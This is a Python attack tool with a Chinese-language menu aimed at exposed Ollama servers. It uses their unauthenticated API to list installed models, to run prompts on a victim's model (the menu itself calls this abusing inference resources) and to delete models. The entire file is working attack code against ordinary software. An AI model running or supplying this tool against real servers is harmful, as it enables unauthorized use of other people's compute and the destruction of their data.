from cmd import PROMPT
import requests
import json

def list_models(ip, port=11434):
    try:
        url = f'http://{ip}:{port}/api/tags'
        response = requests.get(url, timeout=5)
        response.raise_for_status()
        models_data = response.json()
        if 'models' in models_data:
            print("Ollama 服务中的模型列表：")
            for model in models_data['models']:
                print(model.get('name', '未知模型名称'))
        else:
            print("未从响应中获取到模型信息。")
    except requests.ConnectionError:
        print(f"无法连接到 IP {ip}，端口 {port} 的 Ollama 服务。")
    except requests.Timeout:
        print(f"连接 IP {ip}，端口 {port} 的 Ollama 服务超时。")
    except requests.RequestException as e:
        print(f"访问 IP {ip}，端口 {port} 的 Ollama 服务时发生错误: {e}")
    except ValueError:
        print("Ollama 服务返回的内容不是有效的 JSON 格式。")

def abuse_inference(ip, model_name, port=11434):
    while True:
        prompt = input("请输入 prompt（输入 'q' 退出）: ")
        if prompt.lower() == 'q':
            break
        try:
            url = f'http://{ip}:{port}/api/chat'
            payload = {
                "model": model_name,
                "messages": [
                    {
                        "role": "user",
                        "content": prompt
                    }
                ],
                "stream": False
            }
            headers = {
                'Content-Type': 'application/json'
            }
            response = requests.post(url, headers=headers, data=json.dumps(payload))
            response.raise_for_status()
            print(response.text)
        except requests.ConnectionError:
            print(f"无法连接到 IP {ip}，端口 {port} 的 Ollama 服务。")
        except requests.Timeout:
            print(f"连接 IP {ip}，端口 {port} 的 Ollama 服务超时。")
        except requests.RequestException as e:
            print(f"访问 IP {ip}，端口 {port} 的 Ollama 服务时发生错误: {e}")

def delete_model(ip, model_name, port=11434):
    try:
        url = f'http://{ip}:{port}/api/delete'
        payload = {
                "model": model_name
            }

        headers = {
                'Content-Type': 'application/json'
            }
        response = requests.delete(url, headers=headers, data=json.dumps(payload))
        response.raise_for_status()
        print(f"模型 {model_name} 已成功删除。")
    except requests.ConnectionError:
        print(f"无法连接到 IP {ip}，端口 {port} 的 Ollama 服务。")
    except requests.Timeout:
        print(f"连接 IP {ip}，端口 {port} 的 Ollama 服务超时。")
    except requests.RequestException as e:
        print(f"访问 IP {ip}，端口 {port} 的 Ollama 服务时发生错误: {e}")

def main():
    target_ip = input("请输入 Ollama 服务的 IP 地址: ")
    while True:
        print("\n请选择操作：")
        print("1. 打印当前模型列表")
        print("2. 滥用模型推理资源")
        print("3. 删除推理模型")
        print("4. 退出")
        choice = input("请输入选项编号: ")

        if choice == '1':
            list_models(target_ip)
        elif choice == '2':
            model_name = input("请输入要滥用的模型名称: ")
            abuse_inference(target_ip, model_name)
        elif choice == '3':
            model_name = input("请输入要删除的模型名称: ")
            delete_model(target_ip, model_name)
        elif choice == '4':
            print("退出程序。")
            break
        else:
            print("无效的选项，请重新输入。")

if __name__ == "__main__":
    main()